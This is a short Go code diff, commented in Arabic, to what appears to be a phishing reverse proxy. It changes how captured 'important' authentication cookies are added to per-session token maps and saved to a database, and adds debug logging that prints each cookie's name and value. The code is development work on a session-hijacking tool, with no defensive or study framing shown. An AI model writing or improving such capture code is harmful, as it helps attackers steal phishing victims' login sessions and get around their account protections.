@@ -1007,7 +1007,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							// طباعة محتوى CookieTokens قبل الإضافة
 							log.Debug("CookieTokens قبل الإضافة: %d domains", len(s.CookieTokens))
 							
-							s.AddCookieAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Expires)
+							// للكوكيز المهمة، نؤكد بشكل خاص على إضافتها باستخدام الدالة الصحيحة
+							if isImportantCookie {
+								s.AddCookieAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Expires)
+								log.Debug("تم إضافة كوكي مهم: %s = %s إلى المجال: %s", ck.Name, ck.Value, c_domain)
+							} else {
+								s.AddCookieAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Expires)
+							}
 							
 							// طباعة محتوى CookieTokens بعد الإضافة
 							log.Debug("CookieTokens بعد الإضافة: %d domains", len(s.CookieTokens))
@@ -1015,15 +1021,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							// حفظ الكوكيز في قاعدة البيانات فورًا
 							log.Debug("محاولة حفظ الكوكيز في قاعدة البيانات للجلسة: %s", ps.SessionId)
 							
-							// للكوكيز المهمة، نؤكد بشكل خاص على حفظها
+							// للكوكيز المهمة، طباعة معلومات إضافية للتأكد من حفظها
 							if isImportantCookie {
-								// كن متأكداً من وجود المجال في الCookieTokens
-								if _, ok := s.CookieTokens[c_domain]; !ok {
-									s.CookieTokens[c_domain] = make(map[string]string)
-								}
-								
-								// تأكد أن الكوكي موجود في المجال
-								s.CookieTokens[c_domain][ck.Name] = ck.Value
+								log.Debug("حفظ الكوكي المهم %s في قاعدة البيانات (المجال: %s)", ck.Name, c_domain)
 								
 								// حفظ الكوكيز في قاعدة البيانات
 								if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
